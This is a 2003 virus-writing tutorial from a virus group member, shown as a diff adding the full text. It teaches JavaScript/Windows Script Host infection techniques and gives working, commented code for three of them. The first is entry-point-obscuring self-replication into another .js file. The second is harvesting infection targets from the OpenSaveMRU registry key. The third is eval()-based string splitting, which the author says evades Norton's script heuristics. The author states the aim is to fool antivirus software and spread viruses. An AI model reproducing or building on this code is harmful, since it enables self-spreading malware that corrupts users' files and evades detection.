@@ -1,0 +1,390 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************      Useful things in JavaScript     ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+.intro words
+
+  After writing articles about Encryption and Polymorphism in JavaScript I also
+  discovered some other things in JavaScript. But that techniques are to short to
+  write more articles about it, so I desided to write one containing all the things
+  I found out while discovering that language. So, here we are...
+
+
+
+
+
+
+.index
+
+  1) EPO or middle infection in JavaScript
+  2) Searching for victims in the registry (Not for Win95|98|ME)
+  3) Encrypting commands
+
+
+
+
+
+.EPO or middle infection in JavaScript
+
+  Entry-Point Obscuring is a neverseen technique in JavaScript, also it will be
+  hard to detect the virus inside the file and it will be even harder to desinfect
+  a file infected by an EPO JavaScript virus. But I think, that I have to explain the
+  technique for everybody. I wanna show you a normal file and a file infect by an EPO
+  virus:
+
+   Not infected sample:         Infected sample:
+
+    _______________              _______________
+   |               |            |               |
+   |   commands    |            | Call to virus |
+   |               |            |               |
+   |   commands    |            |   commands    |
+   |               |            |               |
+   |   commands    |            |   commands    |
+   |               |            |               |
+   |   commands    |            |     Virus     |
+   |_______________|            |               |
+                                |   commands    |
+                                |               |
+                                |   commands    |
+                                |_______________|
+
+
+  OK, what to do? First we have to search any .JS file. Than we want to write the virus
+  code to any line of the program. Sounds easy, but you forgot something: You can't
+  write your code to any place of the file, because the real program would be killed.
+  So, where to include the virus-code? A possible answere: Include your code before
+  any 'function' in the code. If you do so, the orginal host-file won't be destruct.
+  Another fact you have to think of is, thatyou have to search your virus-code in the
+  file, and not to copy the whole file (=viruscode+host code) to the new victim.
+  OK, now let's have a look at the example file.
+
+ - - - - - - - [EPO-example] - - - - - - - 
+
+virus()
+
+function virus()
+{
+  var fso=WScript.CreateObject("Scripting.FileSystemObject")
+  var myfile=fso.OpenTextFile(WScript.ScriptFullName)
+  var mycode=""; var line=String.fromCharCode(13)+String.fromCharCode(10)
+  for (i=0; i<500; i++)
+  {
+    code=myfile.ReadLine()
+    if (code=="function virus()") 
+    {
+      for (j=1; j<31; j++) { mycode+=code+line; code=myfile.ReadLine() }
+      i=666;
+    }
+  }
+  var vicall=fso.OpenTextFile("victim.js").ReadAll()
+  var victim=fso.OpenTextFile("victim.js")
+  var vcode=""; var viccodes=""; vsearch="FUNCTION";
+  for (i=0; i<vicall.length; i++)
+  {
+    vcode=victim.Read(1);
+    if (vcode.toUpperCase()=="F") 
+    { 
+      for (j=1; j<8; j++) { vcode+=victim.Read(1); if (vcode.toUpperCase() !=vsearch.substring(0,j+1)) { j=666 }; i++; } 
+    }
+    if (vcode.toUpperCase()==vsearch) { i=vicall.lenght+666 }
+    if (vcode.toUpperCase()!=vsearch) { viccodes+=vcode }
+  }
+  virinc=fso.OpenTextFile("victim.js", 2).Write("virus()"+line+viccodes+line+mycode+line+"function"+victim.ReadAll())
+  victim.Close();
+}
+
+
+ - - - - - - - [end of EPO-example] - - - - - - - 
+
+  I think, that you don't really understand the thing, because of that, I'll explain it.
+  But first I want to tell you, what the program exactly does. First it opens itself,
+  and searchs the start of itself ("function virus()"). Then it reads 31 lines of the
+  code and save it (that's exactly the size of the virus). Then it opens a file named
+  'victim.js' (i was too lazy to make a real virus, but anyway: that's an EPO expanation
+  and no 'how to write a JavaScript virus"-tutorial :D ). Now it searchs the a string
+  with "function" (but uppercase, so it's no problem, if it's 'fuNcTioN'). If it finds
+  this string, it writes in the file the code before the 'function', the viruscode,
+  the whole code after the 'function' and of corse the call to the virus-function.
+  But now let's look at the code-explanation...
+
+
+ - - - - - - - [EPO-example-explanation] - - - - - - - 
+
+>> virus()
+	Guess what? That's t call to the virus-function. Without it, the file will be
+	infect, but the virus will never run. Because of that I thought, it's better
+	to include that line :D
+
+>> function virus()
+>> {
+	That's our function. Here starts the virus-code.
+
+>> var fso=WScript.CreateObject("Scripting.FileSystemObject")
+>> var myfile=fso.OpenTextFile(WScript.ScriptFullName)
+	'fso' is the FileSystemObject. Without that we won't be able to read or write
+	anything to a file. That means, it's a very important opject. And myfile is the
+	variable, which we opend our own file.
+
+>> var mycode=""; var line=String.fromCharCode(13)+String.fromCharCode(10)
+	We set some variables: 'mycode' will contain the viruscode at the end of the
+	virus-run, and line contains chr(13)+chr(10). What's that, you may think?
+	That's the same as the 'enter'-key ;)
+
+>> for (i=0; i<500; i++)
+>> {
+	Next things will run 500 times (not really, because the 'for' will stopp after
+	the finish of reading from the victim-file.
+
+>> code=myfile.ReadLine()
+	Does what it sounds like: now code is one line of our own file. We need it,
+	because we want to find our virus-code. (maybe now in the first generation, but
+	for sure in the next ones)
+
+>> if (code=="function virus()") 
+>> {
+	If we found the first line of our code, let's do the next commands.
+
+>> for (j=1; j<31; j++) { mycode+=code+line; code=myfile.ReadLine() }
+	The virus-code has 31 lines, because of that we have to read the 31st lines
+	we find after the start. Than we have the viruscode.
+
+>> i=666;
+>> }
+>> }
+	This is a very ugly way to stopp a 'for', but my favorit one :). After that the
+	'for' ends and than the 'if'.
+
+>> var vicall=fso.OpenTextFile("victim.js").ReadAll()
+	vicall=the whole code of the victim, that we want to infect. We need that because
+	we want to know the size of the victim.
+
+>> var victim=fso.OpenTextFile("victim.js")
+	Now we open our victim again to read every letter for it's own., because we want wo
+	find a function.
+
+>> var vcode=""; var viccodes=""; vsearch="FUNCTION";
+	That's three variables we need in our code. vcode be compain one byte every run of the
+	next 'for', viccode will contain the whole code of the victim before the function starts,
+	and vsearch contains the searchstring, that we need to compair with the string we found in
+	our victim.
+
+>> for (i=0; i<vicall.length; i++)
+>> {
+	Next things will run as often as our victim is long.
+
+>> vcode=victim.Read(1);
+	We read one byte of the victimcode.
+
+>> if (vcode.toUpperCase()=="F") 
+>> { 
+	If the uppercase of the letter we read is "F", we do the next things (maybe we found a 
+	function?! yahuu :D )
+
+>> for (j=1; j<8; j++) { vcode+=victim.Read(1); if (vcode.toUpperCase() !=vsearch.substring(0,j+1)) { j=666 }; i++; } 
+	We read 8 more letters (F=1, U=2, N=3, ...). If that string we found is not the string we're
+	searching for, we stopp to read more letters this time ('j=666'=close the for in my favorit way.
+	Than we add 1 to i, otherwise there would be a 'Read After EOF'-Error.
+>> }
+	Close our important 'if'.
+
+>> if (vcode.toUpperCase()==vsearch) { i=vicall.lenght+666 }
+	now let's compair, if the whole string we read ('F'+7 other letters) is the thing we're
+	searching for ('FUNCTION'). If yes, we stop to search functions, because we already found
+	one... ;)
+
+>> if (vcode.toUpperCase()!=vsearch) { viccodes+=vcode }
+	If the things aren't the same, we copy the 8 letters to our start of the victim-code,
+	because we'll need them in the end of the code.
+
+>> }
+	End of the "searching after functions"-'for'.
+
+>> virinc=fso.OpenTextFile("victim.js", 2).Write("virus()"+line+viccodes+line+mycode+line+"function"+victim.ReadAll())
+	We open the victim again to write into it (look at the '2'). Than we write into it a
+	call to our virus-function ('virus()'). Then we'll add a blank-line, than the victim-code
+	before the function, than again a blank-line, than our virus code, than once more a
+	blank-line, than the string "function" (because we didn't add it to any variable), than
+	the rest of the victim-code. Here we have it... our infect file ;)
+
+>> victim.Close();
+	Let's close te victim-file.
+>> }
+	And end of our virus function.
+
+
+ - - - - - - - [end of EPO-example-explanation] - - - - - - - 
+
+
+
+
+
+
+.Searching for victims in the registry (Not for Win95|98|ME)
+
+  At least every JavaScript virus (not worm!) searchs for files in the current directory and
+  sometimes also in Windows-, System- or Temp-directorys. But I'm sure, that no user will
+  execute a file in the system or temp-directory. Because of that I thought, I have to find
+  an other way to find victim, and suddenly the Registry came to my mind. OK, now let's
+  search files from registry. Now we have to know the key, where we can find the files.
+
+  And here is it:
+
+ - - - - - - -  - [registry-key for JavaScript files] - - - - - - - - -
+
+HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\\MRUList
+
+ - - - - - - - [end of registry-key for JavaScript files] - - - - - - - 
+
+  Now we have a list of some JavaScript-files. For instance that:
+
+ - - - - - - - [registry-key list] - - - - - - - 
+
+(standart)	REG_SZ		(no value)
+a		REG_SZ		C:\Windows\victim.js
+b		REG_SZ		C:\Files\JavaScripts\work.js
+c		REG_SZ		D:\Games\Race-Game\runme.js
+d		REG_SZ		C:\My Shared Docs\flowers.js
+MRUList		REG_SZ		dcab
+
+ - - - - - [end of registry-key list] - - - - - -
+
+  Our list contains four files, but it's also possible, that there are ten samples.
+  OK, but how do we know, how many files there are? We want to infect every of this
+  files, but if we try to read a key, that doesn't exist, there will be an error.
+  So what to do? Let's look at the 'MRUList'. It's value contains every key, which
+  contains a file. What do do with it? We have to read the whole 'MRUList' value,
+  than we read every key, which is in the 'MRUList'. Dadaaa... we have all files ;)
+  Maybe you don't really understand, what I mean, because of that You will find an
+  example.
+
+ - - - - - - - [registry-key example] - - - - - - - - - -
+
+var fso=WScript.CreateObject("Scripting.FileSystemObject")
+var shell=WScript.CreateObject("WScript.Shell")
+MRU="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\\"
+MRUList=shell.RegRead(MRU+"MRUList")
+for (i=1; i<=MRUList.length; i++)
+{
+  victim=shell.RegRead(MRU+MRUList.substring(i-1,i))
+  if (fso.FileExists(victim))
+  {
+    WScript.Echo(victim)
+  }
+}
+
+ - - - - - - - [end of registry-key example] - - - - - - - 
+
+  That example makes a MessageBox for every file, which is in that key, and that exists
+  at the computer (because it's able, that there is a file-name in the registry and it
+  doesn't exist at the computer anymore), because we don't want to have a "File not found"
+  error. Now you'll find an exact explanation of the example.
+
+ - - - - - - - [explanation of registry-key example] - - - - - - - - - -
+
+>> var fso=WScript.CreateObject("Scripting.FileSystemObject")
+>> var shell=WScript.CreateObject("WScript.Shell")
+	This are two variables, which are used for reading from the registry (shell) and
+	for checking if the file exists (fso).
+
+>> MRU="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\\"
+	The variable with the key for the registry. I wrote it to a variable, otherwise
+	the program will be bigger, because I've to use this key two times.
+
+>> MRUList=shell.RegRead(MRU+"MRUList")
+	This variable is the content of the 'MRUList'. In our example it was 'dcba'.
+	I'll use it to check, how many entries are in the key.
+
+>> for (i=1; i<=MRUList.length; i++)
+>> {
+	The next things will run as often, as long MRUList is (in our example 4 Bytes=
+	4 times). I used this, because we know, as many letters are in MRUList, as many
+	entrys are in the key.
+
+>> victim=shell.RegRead(MRU+MRUList.substring(i-1,i))
+	Variable 'victim' is one letter of the content from MRUList. For instands first run
+	i=1: i-1,i: 1-1,1: 0,1: we read everything from letter zero to letter one (= the first
+	letter in the content). :)
+
+>> if (fso.FileExists(victim))
+>> {
+	Let's check, if the file already exist on the computer. If yes, we'll do the next
+	things. If not, we won't do it. If the file exists, 'fso.FileExists(victim)' will
+	return the value 1. And that's 'TRUE'. Else it will return the value 0 (='FALSE').
+	I think, you got the point.
+
+>> WScript.Echo(victim)
+	After finding key, which contains the filename, finding the the filename and checking
+	if the file exists, we're making a messagebox to write the filename. If you use this
+	technique for a virus, you have to include your file-infection code here. But I thought,
+	that i don't have to include a virus-body. :)
+>> }
+>> }
+	The last part in the example is the end of the 'if', which checked, if the file exists
+	and the end of the 'for', which run as often as much files exists.
+
+ - - - - - - - [end of explanation ofregistry-key example] - - - - - - - 
+
+
+
+
+
+
+.Encrypting commands
+
+  While writing an article about JavaScript string encryption, I had no idea how to encrypt
+  the commands, also they are as important as the strings. After reading some things about
+  JavaScript, the idea came to my mind. And it's a very nice one. The princip after the whole
+  idea is the command 'eval()'. The command run strings. :) Let's have a look at the command.
+
+ - - - - - - - ['eval()' example] - - - - - - - 
+
+eval('WScript.Echo("Any silly message")')
+
+
+ - - - - - - [end of 'eval()' example] - - - - -
+
+  You got the point? The only thing we have to do is to encrypt the command in the same was as
+  a string, and set it to the command. This could be very important, because for instands
+  Norton AV's Script-Checker Heuristic will detect a virus, which creates a simple file.
+  Now let's look at a encrypt example. The example only generats a new file named 'eval.txt'.
+  As you will see, this is only a little encrypt, but Norton Script Checker don't detect anything :)
+
+ - - - - - - ['eval()' encryption example] - - - - - - -
+
+var ene="e"
+var eni="i"
+eval('WScr'+eni+'pt.Cr'+ene+'at'+ene+'Object("Scripting.FileSystemObject").Cr'+ene+'at'+ene+'T'+ene+'xtF'+eni+'l'+ene+'("eval.txt")')
+
+
+ - - - - - [end of 'eval()' encryption example] - - - - -
+
+
+
+
+
+
+.last words
+
+  I think, that these techniques are very useful, if you want to make a JavaScript virus. And I'm
+  sure, that AV's will have problems to desinfect a virus useing my EPO technique, of detect a virus,
+  wich is 100% encrypt with the 'eval()' technique. And I'm sure, that spreading the virus ALSO (not
+  only) with that registry technique will be much more successfull than don't use it.
+  My goal is to fool AVs with techniques, which are hard to detect or desinfect. And I think, this time
+  I was successful in doing that. :)
+
+
+							- - - - - - - - - - - - - - -
+							  Second Part To Hell/[rRlf]  
+							  www.spth.de.vu
+							  spth@aonmail.at
+							  written in may 2003
+							  Austria
+							- - - - - - - - - - - - - - - 
